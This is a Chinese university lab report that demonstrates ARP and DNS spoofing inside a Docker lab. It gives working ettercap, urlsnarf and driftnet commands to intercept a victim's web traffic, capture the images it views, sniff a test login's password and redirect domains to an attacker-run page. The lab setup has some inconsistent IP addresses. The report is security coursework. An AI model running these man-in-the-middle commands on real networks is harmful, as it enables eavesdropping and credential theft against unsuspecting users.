# Lab9 - ARP欺骗与DNS欺骗分析





**姓名：王骏**

**学号：22020007104**

**专业：2022级计算机科学与技术**

**日期：2025.10.21**



<div STYLE="page-break-after:always"></div>

# 目录

[TOC]



## 实验内容

通过该实验了解ARP欺骗与DNS欺骗的原理与方法

## 操作步骤

### 环境准备

攻击者：192.168.120.129 操作系统：kali

受害主机：192.168.120.131 操作系统：win7

Web服务器：192.168.65.143 操作系统：windows server 2008 r2

辅助工具：fping，ettercap，driftnet

本实验不提供线上实验环境，请学习者根据指导书自行实验。

本次实验在WSL2-Docker环境下进行。

```bash
# 1. 创建网络，使用正确的网关 192.168.120.2
docker network create --subnet=192.168.120.0/24 --gateway=192.168.120.2 --driver bridge arp-lab-network

# 2. 启动容器
docker run -itd --name victim --network arp-lab-network --ip 192.168.120.131 alpine:latest sleep 1000000
docker run -itd --name webserver --network arp-lab-network --ip 192.168.120.143 nginx:alpine
docker run -itd --name attacker --network arp-lab-network --ip 192.168.120.129 --privileged kalilinux/kali-rolling

# 3. 安装必要工具
docker exec victim apk update && apk add curl wget
docker exec attacker apt update && apt install -y ettercap-text-only dsniff driftnet fping nmap apache2
```

成功部署后，docker界面如下

![image-20251021164407004](https://cdn.jsdelivr.net/gh/violet-wdream/Drawio/PNG/image-20251021164407004.png)

### 实验步骤一：通过ARP欺骗来获取目标正在浏览的网页

所有我们的任务分为4个部分

1. 获取目标正在浏览的网页。
2. 获取目标正在访问的图片。
3. 获取目标输入的账号密码。
4. DNS攻击

查看受害主机的arp列表，里面包含网关，攻击主机的ip和mac

可以看到还没有进行arp欺骗时正常的arp列表

看看有哪些存活的主机也在局域网中。这里用fping命令，我们可以看到我们的受害主机。

```bash
fping -g 192.168.120.0/24 2>/dev/null | grep alive
```

![image-20251021164509201](https://cdn.jsdelivr.net/gh/violet-wdream/Drawio/PNG/image-20251021164509201.png)

A和B发给对方的数据包都发到了C这里，这样A和B就无法进行正常通信了，这样就会被受害者发现。所以需要IP转发。

```bash
# 在攻击机容器内：
# 1. 开启IP转发
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. 使用ettercap进行ARP欺骗（双向欺骗）
ettercap -T -i eth0 -M arp:remote /192.168.120.131// /192.168.120.1//

# 3. 另开终端捕获网页
docker exec -it attacker bash
urlsnarf -i eth0
```

![image-20251021164548506](https://cdn.jsdelivr.net/gh/violet-wdream/Drawio/PNG/image-20251021164548506.png)

![image-20251021164701639](https://cdn.jsdelivr.net/gh/violet-wdream/Drawio/PNG/image-20251021164701639.png)



查看ARP新的列表。发现网关的MAC已经变成攻击者的了，这说明ARP欺骗已经生效了。

![image-20251021115909016](https://cdn.jsdelivr.net/gh/violet-wdream/Drawio/PNG/image-20251021115909016.png)

```json
network IP:192.168.120.129 MAC:12:51:6b:c9:36:14
attacker IP:192.168.120.1 MAC:12:51:6b:c9:36:14
```

受害机victim浏览web服务器创建的网页`192.168.65.143`

![image-20251021144136624](https://cdn.jsdelivr.net/gh/violet-wdream/Drawio/PNG/image-20251021144136624.png)

### 实验步骤二：ARP欺骗来获取目标正在访问的图片

```
driftnet -i eth0 -a -d /tmp/images
```

![image-20251021142844317](https://cdn.jsdelivr.net/gh/violet-wdream/Drawio/PNG/image-20251021142844317.png)

受害主机浏览web服务器创建的图片网页

攻击主机出现结果，我们可以看见出来很多照片

我们到/tmp目录下去查看图片

![image-20251021165227815](https://cdn.jsdelivr.net/gh/violet-wdream/Drawio/PNG/image-20251021165227815.png)

### 实验步骤三：ARP欺骗来获取目标输入的账号密码

```bash
ettercap -T -i eth0 -M arp:remote /192.168.120.131// /192.168.120.2//
# 模拟登录操作
docker exec victim curl -X POST -d "username=testuser&password=testpass123" http://192.168.120.143/login.html
```

![image-20251021170109097](https://cdn.jsdelivr.net/gh/violet-wdream/Drawio/PNG/image-20251021170109097.png)



### 实验步骤四

```bash
# 1. 启动Apache服务并创建欺骗页面
service apache2 start
echo '<html><body><h1>警告！这可能是一个伪造的网站！</h1><p>DNS欺骗演示成功！</p></body></html>' > /var/www/html/index.html

# 2. 启动DNS欺骗
ettercap -T -i eth0 -P dns_spoof -M arp:remote /192.168.120.131// /192.168.120.2//

# 测试DNS欺骗
docker exec victim nslookup www.taobao.com
docker exec victim nslookup www.baidu.com
docker exec victim curl http://www.taobao.com
docker exec victim curl http://www.baidu.com
# 这些请求都应该被重定向到攻击者的Apache服务器
```

![image-20251021170157620](https://cdn.jsdelivr.net/gh/violet-wdream/Drawio/PNG/image-20251021170157620.png)

## 实验总结

本次ARP欺骗与DNS欺骗实验通过Docker环境成功构建了模拟攻击场景，验证了中间人攻击的原理和危害。实验表明，ARP协议因缺乏认证机制而易被篡改，攻击者可通过ARP欺骗劫持网络流量，进而实施URL嗅探、图片捕获和密码窃取。在ARP欺骗基础上，通过DNS欺骗进一步实现了域名重定向，展示了钓鱼攻击的实际威胁。





















